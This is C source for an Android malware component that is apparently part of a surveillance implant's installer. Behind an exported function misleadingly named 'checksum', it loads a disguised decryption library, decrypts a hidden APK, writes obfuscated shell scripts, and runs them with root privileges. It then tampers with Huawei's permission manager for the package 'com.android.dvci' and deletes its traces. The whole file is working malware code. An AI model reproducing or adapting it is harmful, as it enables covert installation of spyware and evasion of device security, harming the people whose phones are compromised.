#include <stdio.h>
#include <unistd.h>
#include <sys/time.h>
#include <stdlib.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/system_properties.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <dlfcn.h>

#include "shell_params.h"
#include "log.h"
#include "deobfuscate.h"

typedef int (*decrypt_t)(char *);

static unsigned char enc_script[] = "\xfc\x6d\x0e\x21\x27\x2d\x91\x9f\x91\x98\x6b\x93\x2d\x66\x6f\x92\x2d\x91\x6c\x0e\x61\x67\x98\x24\x2b\x91\x24\x42\x24\x2d\x68\x67\x98\x67\x2d\x90\x6d\x61\x67\x90\x2d\x98\x93\x94\x2d\x98\x93\x94\x0e\x96\x93\x24\x2b\x91\x0e\x61\x6c\x93\x6d\x68\x24\x55\x5b\x5b\x24\x2d\x68\x67\x98\x67\x2d\x90\x6d\x61\x67\x90\x2d\x98\x93\x94\x2d\x98\x93\x94\x0e\x91\x6b\x98\x98\x6f\x92\x65\x91\x24\x94\x9b\x98\x24\x65\x90\x6d\x66\x67\x90\x24\x94\x67\x61\x69\x67\x65\x6b\x7d\x9a\x6b\x96\x6f\x6a\x6f\x6b\x96\x7d\x6b\x92\x67\x66\x90\x6b\x24\x54\x0e\x94\x93\x24\x68\x6f\x91\x67\x66\x90\x6b\x24\x61\x6d\x93\x52\x67\x92\x68\x96\x6d\x6f\x68\x52\x9a\x6b\x92\x68\x6f\x92\x65\x0e"; 

static unsigned char enc_script2[] = "\xb6\xce\xaf\x63\x50\xaa\x75\xaa\xa7\x50\xaa\xac\xa9\x5d\x53\x5d\x5e\x6f\x67\xa9\x6b\x5a\x5a\xa9\x02\x41\x7a\x6f\x5c\x67\x63\x5d\x5d\x63\x69\x68\x07\x6b\x68\x6b\x51\x6f\x5c\xa8\x6b\x5a\x65\xac\xaa\x77\x44\x5e\x62\x6f\x68\x44\x5a\x67\xaa\x6e\x63\x5d\x6b\x6c\x66\x6f\xaa\x6d\x69\x67\xa8\x62\x5f\x6b\x41\x6f\x63\xa8\x5a\x6f\x5c\x67\x63\x5d\x5d\x63\x69\x68\x67\x6b\x68\x6b\x51\x6f\x5c\x44\x50\x63\x44\x5d\x66\x6f\x6f\x5a\xaa\x9b\x44\x5a\x67\xaa\x63\x68\x5d\x5e\x6b\x66\x66\xaa\xa9\x6e\x6b\x5e\x6b\xa9\x66\x69\x6d\x6b\x66\xa9\x5e\x67\x5a\xa9\x5e\x67\x5a\x44\x5c\x67\xaa\xa9\x6e\x6b\x5e\x6b\xa9\x66\x69\x6d\x6b\x66\xa9\x5e\x67\x5a\xa9\x5e\x67\x5a\x44\x6b\x67\xaa\x5d\x5e\x6b\x5c\x5e\x5d\x6f\x5c\x40\x63\x6d\x6f\xaa\xa7\x68\xaa\x6d\x69\x67\xa8\x6b\x68\x6e\x5c\x69\x63\x6e\xa8\x6e\x40\x6d\x63\xa9\xa8\x7d\x6f\x5c\x40\x63\x6d\x6f\x07\x6b\x63\x68\x44\x5d\x66\x6f\x6f\x5a\xaa\x9c\x44";

static unsigned char enc_script3[] = "\x7e\xc2\x0d\x0d\x1f\x0e\x0e\x1b\x10\x19\x0d\xe2\x12\x0f\x0e\xe2\x19\x16\x11\x1c\x23\x16\xe2\x12\x23\x1d\x15\x23\x19\x1f\x21\x08\x1f\x0c\x1b\x18\x1b\x1f\x0c\x21\x1f\x10\x23\x1c\x16\x1f\xe2\xd3\xf4\x12\x17\xe2\x1f\x10\x23\x1c\x16\x1f\xe2\x1d\x11\x17\xd0\x23\x10\x1e\x0c\x11\x1b\x1e\xd0\x08\x1f\x10\x1e\x1b\x10\x19\xf4\x1b\x18\xe2\x25\xe2\xd7\x18\xe2\xdc\xd1\x0d\x0b\x0d\x0e\x1f\x17\xd1\x23\x12\x12\xd1\x3a\x09\x32\x1f\x0c\x17\x1b\x0d\x0d\x1b\x11\x10\x37\x23\x10\x23\x19\x1f\x0c\xd0\x23\x12\x15\xdc\xe2\x27\xf4\x0e\x1a\x1f\x10\xf4\x12\x17\xe2\x1f\x10\x23\x1c\x16\x1f\xe2\x1d\x11\x17\xd0\x1a\x0f\x23\x09\x1f\x1b\xd0\x12\x1f\x0c\x17\x1b\x0d\x0d\x1b\x11\x10\x17\x23\x10\x23\x19\x1f\x0c\xf4\x18\x1b\xf4\x0c\x17\xe2\xdf\x0d\xf4";

static unsigned char shtmp[] = "\x53\xd9\x8f\x20\xcd\xd9\xce\x25"; // "shtmp"
static unsigned char rcs[] = "\x2f\x84\xac\x43\x40\x48\x01\x5b\x42\x67"; // "log.tmp"
static unsigned char bson_path[] = "\x49\xdd\x85\x99\x99\x9e\xdf\x20\xd5\x9e\xdf\x20\xd5\xd5\xca\xde\xd9\x99\xca\xde"; // "../lib/libbson.so"
static unsigned char bson_sym[] = "\xdc\x2a\xfe\x87\xf5\xf3\x9e\xcd\xf0\xf5\xc8"; // "_isValid"

__attribute__ ((visibility ("default"))) int checksum(void) {
  char current_path_shtmp[512];
  char current_path_rcs[512];
  FILE * install_rcs  = NULL;
  char script[1024];
  char script2[1024];
  char complete_script[2048];
  char script_rcs[512];
  void *handle;
  char script_sql_huawei[512];

  static unsigned char qzx[] = "\x8c\x90\x1f\x1d\x16\x14"; // "qzx"
  unsigned char sql[] = "\x16\xfc\xe9\x9d\x9f\x8a"; // "sql"
  unsigned char rcs_pkg[] = "\x51\x69\x28\xf2\xce\xcc\x81\xf0\xc1\xf7\xe5\xce\xc8\xf7\x81\xf7\xf9\xf2\xc8"; // "com.android.dvci"
  unsigned char hwperm[] = "\x92\x70\xc1\x5d\x21\x2b\x21\x26\x17\x1f\x5d\x13\x22\x22\x5d\x3a\x25\x42\x17\x20\x1f\x1b\x21\x21\x1b\x1d\x1c\x3f\x13\x1c\x13\x15\x17\x20\x5c\x13\x22\x19"; // "/system/app/HwPermissionManager.apk"
  struct stat st;
  char *error;

  LOGD("[APK INSTALLER] Starting apk installation\n");
  LOGD("[APK INSTALLER] Opening crypto lib\n");
  int test = 5;
open_dl:
  error = malloc(512);
  error = getcwd(error,512);
  // Open crypto library
  if(handle){
    dlclose(handle);
    handle = NULL;
    error = NULL;
  }
  handle = dlopen(deobfuscate(bson_path), RTLD_LAZY);
  if(!handle) {
    LOGD("[APK INSTALLER] Unable to open crypto lib\n");
    return 0;
  }
  if(error!=NULL) {
    LOGD("[APK INSTALLER] opened crypto lib at %s/%s\n",error,deobfuscate(bson_path));
    free(error);
    error=NULL;
  }
  decrypt_t decrypt_ptr = (decrypt_t) dlsym(handle, deobfuscate(bson_sym));
  if ((error = dlerror()) != NULL) {
    LOGD("[APK INSTALLER] Unable to find crypto sym: %s\n error %s",deobfuscate(bson_sym),error);
    if (test --){
      LOGD("[APK INSTALLER] try again %d\n",test);
      goto open_dl;
    }
    return 0;
  }

  memset(current_path_shtmp, 0, sizeof(current_path_shtmp));

  // Current script path
  getcwd(current_path_shtmp, sizeof(current_path_shtmp));
  strcat(current_path_shtmp, "/");
  strncpy(current_path_rcs, current_path_shtmp, sizeof(current_path_rcs)); 

  strcat(current_path_shtmp, deobfuscate(shtmp));
  strcat(current_path_rcs, deobfuscate(rcs));

  LOGD("[APK INSTALLER] Installation script path: %s\n", current_path_shtmp);
  LOGD("[APK INSTALLER] Apk path: %s\n", current_path_rcs);

  if(stat(current_path_rcs, &st) < 0) {
    LOGD("[APK INSTALLER] Apk not present... aborting\n");
    return 0;
  }

  install_rcs = fopen(deobfuscate(shtmp), "w");  // installation script

  if(!install_rcs) {
    LOGD("[APK INSTALLER] Script file creation failed... aborting\n");
    return 0;
  }

  // Extract the script
  memset(&script, 0, sizeof(script));
  memset(&complete_script, 0, sizeof(complete_script));

  snprintf(script, sizeof(script), deobfuscate(enc_script), current_path_rcs, current_path_rcs);
  snprintf(script2, sizeof(script2), deobfuscate(enc_script3), current_path_shtmp);

  snprintf(complete_script, sizeof(complete_script), "%s%s%s", script, deobfuscate(enc_script2), script2);

  fwrite(&complete_script, 1, strlen(complete_script), install_rcs);
  fclose(install_rcs);
  chmod(deobfuscate(shtmp), 0777);

  memset(script_rcs, 0, sizeof(script_rcs));
  snprintf(script_rcs, sizeof(script_rcs), "%s %s %s", deobfuscate(ROOT_BIN), deobfuscate(qzx), current_path_shtmp);

  fclose(install_rcs);

  // Decrypt before install
  LOGD("[APK INSTALLER] Decrypting apk...!\n");
  if(!decrypt_ptr(current_path_rcs)) {
    remove(deobfuscate(current_path_shtmp));
    remove(current_path_rcs);
    LOGD("[APK INSTALLER] Decryption failed...!\n");
    return 0;
  }

  LOGD("[APK INSTALLER] Starting installation script!\n");
  system(script_rcs);

  // After installation we need to check if the Huawei permission manager application is installed
  if(!stat(deobfuscate(hwperm), &st)) {
    memset(script_sql_huawei, 0, sizeof(script_sql_huawei));
    snprintf(script_sql_huawei, sizeof(script_sql_huawei), "%s %s %s", deobfuscate(ROOT_BIN), deobfuscate(sql), deobfuscate(rcs_pkg));
    
    system(script_sql_huawei);
  }
  


  LOGD("[APK INSTALLER] All done!\n");
  remove(current_path_shtmp); // Just to be sure
  remove(current_path_rcs); 

  return 1;
}
